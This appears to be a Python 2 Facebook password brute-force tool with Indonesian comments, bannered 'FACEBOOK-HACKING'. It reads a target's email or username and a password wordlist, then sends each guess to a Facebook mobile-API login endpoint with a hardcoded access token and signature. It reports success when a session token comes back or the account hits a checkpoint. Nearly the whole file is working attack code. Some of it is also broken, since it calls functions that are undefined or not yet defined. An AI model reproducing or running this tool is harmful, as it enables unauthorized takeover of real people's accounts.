	#coded by Bl4ck Dr460n
"""Dilarang Recode Ya Bossq Saya Udh Cape2 Buat Tools Ini
Saya Tau Agan Bisa Buat Tools Sendiri, Agan Anggap Ini Sampah
Ini Cuma Tools Biasa Saja"""
import os,sys,time,urllib,json
try:
	import requests
except ImportError:
	os.system('pip2 install requests')
	menu()

GL = "\033[96;1m" # Blue aqua
BB = "\033[34;1m" # Blue light
YY = "\033[33;1m" # Yellow light
GG = "\033[32;1m" # Green light
WW = "\033[0;1m"  # White light
RR = "\033[31;1m" # Red light
CC = "\033[36;1m" # Cyan light
B = "\033[34m"    # Blue
Y = "\033[33;1m"    # Yellow
G = "\033[32m"    # Green
W = "\033[0;1m"     # White
R = "\033[31m"    # Red
C = "\033[36;1m"    # Cyan
os.system('clear')
logo = """
"""
os.system('python2 loading')
os.system('toilet -f smblock FACEBOOK-HACKING | lolcat')
def menu():
	to = []
	print logo
	try:
		print
		usr = raw_input("\033[33;1mEmail \033[39;1m|\033[33;1m PH\033[39;1m |\033[33;1m ID\033[39;1m |\033[33;1m Username \033[31;1m: "+G)
		pas = raw_input("F i l e\033[31;1m P\033[32;1m a\033[33;1m s\033[34;1m s\033[35;1m w\033[36;1m o\033[37;1m r\033[38;1m d\033[39;1m s \033[31;1m : "+G)
		print
		os.system('clear')
                os.system('python2 banner')
		ps = open(pas, 'r')
		for pwd in ps:
			try:
				p = pwd.replace('\n', '')
				sys.stdout.write(WW+"               [\033[31;1m LOOKFOR \033[39;1m]"+WW+p+"\n")
				sys.stdout.flush()
				data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + usr + '&locale=en_US&password=' + p + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
				j = json.loads(data.text)
				if 'access_token' in j:
					print W+"[\033[32;1m Success\033[0m ]"
					print W+"Email/Id/Username : "+G+usr
					print W+"Password          : "+G+p
					print
					sys.exit()
				elif 'www.facebook.com' in j['error_msg']:
                                      os.system('clear')
                                      print W+"[\033[33;1m 7DAY \033[0m ]"
                        	      print W+" Email/Id/Username : "+Y+usr
                                      print W+" Password          : "+Y+p
	                              print
                                      sys.exit()


			except requests.ConnectionError:
				print R+"Tidak Ada Koneksi"
				sys.exit()

	except IOError:
		print R+"File Not Found"
		ed = str(raw_input("[?] Edit wordlist cuk.? \033[96;1m[y/n]: "))
                if ed == 'y' or ed == 'Y':
                      os.system('nano wordlist.txt')
                      pil()
                elif ed == 'n' or ed == 'N':
                        print "Keluar Dari Program..."
                        os.system('exit')

                else: 
                      print RR+"Pilih yg bener cuk..."

if __name__ == '__main__':
	menu()
